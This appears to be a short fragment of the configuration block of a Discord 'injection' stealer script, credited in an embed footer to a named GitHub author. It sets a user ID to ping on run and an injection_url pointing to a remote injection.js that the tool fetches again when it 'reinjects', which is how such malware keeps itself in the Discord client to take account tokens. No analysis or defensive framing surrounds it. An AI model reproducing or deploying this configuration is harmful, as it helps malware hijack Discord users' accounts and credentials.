...
const config = {
  ...
  ping_val: '<@312973595141734400>', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
  ...
  injection_url: 'https://raw.githubusercontent.com/999xa/inject/master/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By github.com/Karbone-DEV',
        },
      },
    ],
  };
